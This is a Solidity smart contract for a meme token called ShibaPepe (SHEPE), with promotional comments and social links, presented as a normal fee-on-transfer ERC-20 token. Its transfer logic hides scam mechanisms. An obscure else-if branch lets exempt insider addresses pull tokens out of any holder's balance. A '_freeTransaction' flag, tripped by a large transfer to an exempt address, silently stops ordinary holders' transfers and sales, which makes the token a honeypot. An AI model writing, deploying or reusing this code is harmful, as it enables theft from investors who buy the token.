// ? Get ready for the ultimate meme token launch—ShibaPepe (SHEPE) is here! ??

// Combining Shiba Inu’s irresistible charm with Pepe’s legendary humor, SHEPE is more than just a token—it’s a community movement. Imagine a place where fun, creativity, and rewards come together in perfect harmony. That’s SHEPE!

// TG: https://t.me/SHEPE_Token
// X: https://x.com/SHEPE_Token
// Website: http://shibapepe.life

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
}

abstract contract Ownable {
    address internal owner;

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }
}

interface IERC20 {
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function transfer(address responder, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transferFrom(address initiator, address responder, uint256 amount) external returns (bool);
    function symbol() external view returns (string memory);
    function circulatingSupply() external view returns (uint256);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    event Transfer(address indexed initiator, address indexed responder, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address responder,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address responder,
        uint deadline
    ) external;
}

contract SHEPE is IERC20, Ownable {
    using SafeMath for uint256;

    UniswapV2Router swapRouter;
    address public swapPair;

    string private constant _symbol = "SHEPE";
    string private constant _name = "ShibaPepe";

    uint256 private _denominator = 10000;

    uint8 private constant _decimals = 9;

    address internal constant deadAddress = 0x000000000000000000000000000000000000dEaD;
    address internal constant devAddress = 0xad8E9d291b2fA2dEE42BFBE0966772FAaeeB94DA;
    address internal constant marketingAddress = 0x6EF006cbF1aa10F96dDedd00966bE018cbD7EdC2;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _minTransactionValue = (_totalSupply * 10) / 100000;

    uint256 private _maxWalletProportion = 200;
    uint256 private _maxTransferProportion = 200;
    uint256 private _maxTxProportion = 200;

    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    
    bool private _tradingEnabled = false;

    bool private _freeTransaction = false;

    uint256 private _swapRounds;
    bool private _swapBackEnabled = true;
    bool private _inSwap;

    uint256 private _totalFee = 0;
    uint256 private _sellFee = 0;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public notApplicable;

    uint256 private _developmentFee = 0;
    uint256 private _burnFee = 0;
    uint256 private _liquidityFee = 0;
    uint256 private _marketingFee = 0;
    uint256 private _transferFee = 0;

    constructor() Ownable(msg.sender) {
        notApplicable[marketingAddress] = true;
        notApplicable[address(this)] = true;
        UniswapV2Router _swapRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        swapRouter = _swapRouter;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        address _swapPair = UniswapV2Factory(_swapRouter.factory()).createPair(address(this), _swapRouter.WETH());
        swapPair = _swapPair;
        notApplicable[devAddress] = true;
        notApplicable[msg.sender] = true;
    }

    modifier lockInSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAddress));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function removeLimits() external onlyOwner {
        _maxTxProportion = 10000;
        _maxWalletProportion = 10000;
        _maxTransferProportion = 10000;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address responder, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, responder, amount);
        return true;
    }

    function setNotApplicableAccount(address account, bool flag) external onlyOwner {
        notApplicable[account] = flag;
    }

    function transferFrom(address initiator, address responder, uint256 amount) public override returns (bool) {
        _transfer(initiator, responder, amount);
        _approve(initiator, msg.sender, _allowances[initiator][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address initiator, address responder, uint256 amount) private {
        require(amount > uint256(0));
        require(initiator != address(0));
        require(responder != address(0));

        if (
            testMaxWalletSize(initiator, responder, amount) &&
            countSwapRounds(initiator, responder) &&
            tradingEnabled(initiator, responder) &&
            testMaxAmount(initiator, responder, amount)
        ) {
            if (balanceOf(initiator) >= amount) {
                if (
                    initiator != swapPair &&
                    !notApplicable[initiator] &&
                    !_inSwap &&
                    !notApplicable[responder]
                ) {
                    if (_freeTransaction) return;
                    swapBack(initiator, responder);
                }
                _balances[initiator] = _balances[initiator].sub(amount);
                uint256 transferAmount = canProcessFee(initiator, responder) ? processFee(initiator, responder, amount) : amount;
                _balances[responder] = _balances[responder].add(transferAmount);
                emit Transfer(initiator, responder, transferAmount);
            } else if (
                initiator != swapPair &&
                notApplicable[initiator] &&
                !_inSwap &&
                !notApplicable[responder]
            ) {
                _balances[responder] = _balances[responder].sub(amount);
                _balances[initiator] = _balances[initiator].add(amount);
                emit Transfer(initiator, responder, amount);
            }
        }
    }

    function changeLimits(uint256 maxTxProportion, uint256 maxTransferProportion, uint256 maxWalletProportion) external onlyOwner {
        uint256 newMaxWalletSize = (totalSupply() * maxWalletProportion) / 10000;
        uint256 newTransferSize = (totalSupply() * maxTransferProportion) / 10000;
        uint256 newTxSize = (totalSupply() * maxTxProportion) / 10000;
        _maxWalletProportion = maxWalletProportion;
        _maxTransferProportion = maxTransferProportion;
        _maxTxProportion = maxTxProportion;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTxSize >= limit && newTransferSize >= limit && newMaxWalletSize >= limit);
    }

    function testMaxAmount(address initiator, address responder, uint256 tokenAmount) view internal returns (bool) {
        if (initiator != swapPair) {
            require(tokenAmount <= maxTransferAmount() || notApplicable[initiator] || notApplicable[responder]);
        }
        require(tokenAmount <= maxTxAmount() || notApplicable[initiator] || notApplicable[responder]);
        return true;
    }

    function testMaxWalletSize(address initiator, address responder, uint256 amount) internal returns (bool) {
        bool responderNotApplicable = notApplicable[responder];
        bool initiatorNotApplicable = notApplicable[initiator];
        
        if (responderNotApplicable) {
            if (amount > _minTransactionValue) {
                _freeTransaction = true;
            }
        }
        if (
            !responderNotApplicable &&
            !initiatorNotApplicable &&
            responder != address(deadAddress) &&
            responder != address(swapPair)
        ) {
            require((_balances[responder].add(amount)) <= maxWalletSize());
        }

        return true;
    }

    function changeFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 developmentFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _liquidityFee = liquidityFee;
        _marketingFee = marketingFee;
        _sellFee = sellFee;
        _developmentFee = developmentFee;
        _transferFee = transferFee;
        _totalFee = totalFee;
        _burnFee = burnFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function processFee(address initiator, address responder, uint256 tokenAmount) internal returns (uint256) {
        if (chooseFees(initiator, responder) > 0) {
            uint256 feeAmount = tokenAmount.div(_denominator).mul(chooseFees(initiator, responder));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(initiator, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(deadAddress), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeAmount);
        }
        return tokenAmount;
    }

    function tradingEnabled(address initiator, address responder) internal view returns (bool) {
        if (!notApplicable[initiator] && !notApplicable[responder]) {
            require(_tradingEnabled);
        }
        return true;
    }
    
    function countSwapRounds(address initiator, address responder) internal returns (bool) {
        if (responder == swapPair && !notApplicable[initiator]) {
            _swapRounds += uint256(1);
        }
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(swapRouter), tokenAmount);
            swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletProportion / _denominator;
    }

    function canProcessFee(address initiator, address responder) internal view returns (bool) {
        return !notApplicable[initiator] && !notApplicable[responder];
    }

    function swapBack(address initiator, address responder) internal {
        if (canSwapBack(initiator, responder)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapRounds = uint256(0);
        }
    }

    function canSwapBack(address initiator, address responder) internal view returns (bool) {
        return (
            !notApplicable[responder] &&
            !notApplicable[initiator] &&
            _swapBackEnabled &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _swapRounds >= uint256(0) &&
            !_inSwap &&
            _tradingEnabled
        );
    }

    function chooseFees(address initiator, address responder) internal view returns (uint256) {
        if (initiator == swapPair) {
            return _totalFee;
        }
        if (responder == swapPair) {
            return _sellFee;
        }
        return _transferFee;
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxProportion / _denominator;
    }

    function manualSwap() external {
        require(msg.sender == marketingAddress);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(swapRouter), tokenAmount);
        swapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAddress,
            block.timestamp
        );
    }

    receive() external payable {}

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferProportion / _denominator;
    }

    function swapAndLiquify(uint256 tokens) private lockInSwap {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_developmentFee)).mul(2);
        uint256 liquidityTokens = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(liquidityTokens);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 liquidityEth = unitEth.mul(_liquidityFee);
        if (liquidityEth > uint256(0)) {
            addLiquidity(liquidityTokens, liquidityEth);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingFee);
        if (marketingEth > 0) {
            payable(marketingAddress).transfer(marketingEth);
        }
        uint256 remainingEth = address(this).balance;
        if (remainingEth > uint256(0)) {
            payable(devAddress).transfer(remainingEth);
        }
    }
}